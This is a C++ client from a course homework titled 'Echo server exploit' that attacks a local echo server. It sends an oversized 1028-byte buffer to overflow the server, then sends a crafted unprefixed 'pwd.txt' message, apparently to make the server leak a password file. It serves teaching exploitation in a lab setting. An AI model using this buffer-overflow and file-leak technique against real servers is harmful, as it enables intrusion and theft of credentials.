// HW 6 - Echo server exploit
// THIS is the file that you need to modify this file for this assignment

#include <iostream>
#include <string>
#include "TCPComm.h"

using namespace std;
using namespace CS422;

int response = 0;

void GotData(TCPComm* comm, unsigned char* data, int dataLength)
{
	char* buf = new char[dataLength + 1];
	memcpy(buf, data, dataLength);
	buf[dataLength] = 0;

	cout << endl;
	cout << "Got from server: " << buf << endl;
	//cout << "Enter a string to send to the server: ";
	response ++;
}

void sendingIt(TCPComm *c, int size, char *buff){
	// create a new buff with room for short size
	char *temp = new char[2 + size];
	// copy the buff to temp with room for short size
	memcpy(&temp[2], buff, size);
	((unsigned short*)temp)[0] = (unsigned short)size;
	c->Send(temp, size + 2);
	delete[] temp;
}

void sneakySend(TCPComm *c, int size, char *buff){
	c->Send(buff, size + 1);
}

TCPComm *init(void){
	TCPComm *comm = TCPComm::Create("localhost", 42200);
	if (!comm)
	{
		cout << "Could not connect to server" << endl;
		cout << "Make sure the server is running first then re-run this client" << endl;
		return 0;
	}

	// Set up callback for when server sends us data
	comm->OnDataReceived = GotData;
	return comm;
}
void niceToMeetYou(TCPComm *c) {
	// Send the handshake
	char* handshake = "422 echo server handshake";
	c->Send(handshake, strlen(handshake) + 1);
}

int main(int argc, const char* argv[])
{
	TCPComm *comm1 = init(), *comm2 = NULL;
	char overflow[1028];
	memset(overflow, 'a', 1028);
	char *pwd = "pwd.txt";

	niceToMeetYou(comm1);
	while(response < 1);

	sendingIt(comm1, 1028, overflow);
	while(response < 2);

	comm2 = init();
	sneakySend(comm1, strlen(pwd) + 1, pwd);
	niceToMeetYou(comm2);
	while(response <3);


/*
	while (true)
	{
		cout << "Enter a string to send to the server: ";
		string line;
		getline(cin, line);

		if (line.empty()) { break; }

		// Send the string, including the null-terminator
		char* buf = new char[3 + line.size()];
		strcpy(&buf[2], line.c_str());
		((unsigned short*)buf)[0] = (unsigned short)(3 + line.size());
		comm->Send(buf, line.size() + 3);
		delete[] buf;
	}
*/
	cout << "Done" << endl;
}
